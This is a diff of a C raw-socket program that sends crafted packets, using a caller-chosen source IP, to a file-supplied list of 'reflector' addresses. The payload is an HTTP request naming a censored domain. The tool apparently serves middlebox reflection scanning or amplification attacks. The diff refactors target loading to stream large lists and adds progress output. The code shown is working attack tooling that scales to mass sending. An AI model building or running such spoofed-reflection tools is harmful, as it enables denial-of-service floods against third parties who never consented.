@@ -24,9 +24,6 @@ typedef struct {
     struct sockaddr_in sin;
 } TargetInfo;
 
-TargetInfo targets[MAX_PACKET];
-int target_count = 0;
-
 const char *payload = "GET / HTTP/1.1\r\nHost: freedomhouse.org\r\n\r\n";
 
 unsigned short checksum(unsigned short *ptr, int nbytes) {
@@ -48,34 +45,6 @@ unsigned short checksum(unsigned short *ptr, int nbytes) {
     sum += (sum >> 16);
     answer = (short)~sum;
     return answer;
-}
-
-void load_targets(const char *filename) {
-    FILE *file = fopen(filename, "r");
-    if (!file) {
-        perror("open file error");
-        exit(1);
-    }
-
-    char line[256];
-    while (fgets(line, sizeof(line), file)) {
-        if (target_count >= MAX_PACKET) break;
-
-        char *ip = strtok(line, ":");
-        char *port_str = strtok(NULL, "\n");
-
-        if (ip && port_str) {
-            TargetInfo *t = &targets[target_count];
-            strcpy(t->ip, ip);
-            t->port = atoi(port_str);
-            t->sin.sin_family = AF_INET;
-            t->sin.sin_port = htons(t->port);
-            t->sin.sin_addr.s_addr = inet_addr(t->ip);
-            target_count++;
-        }
-    }
-
-    fclose(file);
 }
 
 void build_and_send_packet(int sock, const char *src_ip, int src_port, TargetInfo *target) {
@@ -156,16 +125,24 @@ int main(int argc, char *argv[]) {
 
     srand(time(NULL));
 
-    load_targets(reflector_file);
-
-    if (target_count == 0) {
-        printf("No targets loaded.\n");
+    FILE *file = fopen(reflector_file, "r");
+    if (!file) {
+        perror("open file error");
         return 1;
     }
+
+    // 统计总行数
+    char line[256];
+    int total_lines = 0;
+    while (fgets(line, sizeof(line), file)) {
+        total_lines++;
+    }
+    rewind(file);
 
     int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
     if (sock < 0) {
         perror("socket");
+        fclose(file);
         return 1;
     }
 
@@ -173,16 +150,40 @@ int main(int argc, char *argv[]) {
     if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
         perror("setsockopt");
         close(sock);
+        fclose(file);
         return 1;
     }
 
-    for (int i = 0; i < target_count; i++) {
-        build_and_send_packet(sock, src_ip, src_port, &targets[i]);
+    TargetInfo t;
+    int line_count = 0;
+
+    while (fgets(line, sizeof(line), file)) {
+        char *ip = strtok(line, ":");
+        char *port_str = strtok(NULL, "\n");
+
+        if (ip && port_str) {
+            memset(&t, 0, sizeof(t));
+            strcpy(t.ip, ip);
+            t.port = atoi(port_str);
+            t.sin.sin_family = AF_INET;
+            t.sin.sin_port = htons(t.port);
+            t.sin.sin_addr.s_addr = inet_addr(t.ip);
+
+            build_and_send_packet(sock, src_ip, src_port, &t);
+            line_count++;
+
+            // 打印进度
+            if (line_count % 100000 == 0 || line_count == total_lines) {
+                float percent = (line_count * 100.0f) / total_lines;
+                printf("Sent %d/%d packets... (%.1f%%)\n", line_count, total_lines, percent);
+            }
+        }
     }
 
+    fclose(file);
     close(sock);
 
-    printf("Scan finished.\n");
+    printf("Scan finished. Total packets sent: %d\n", line_count);
 
     return 0;
 }
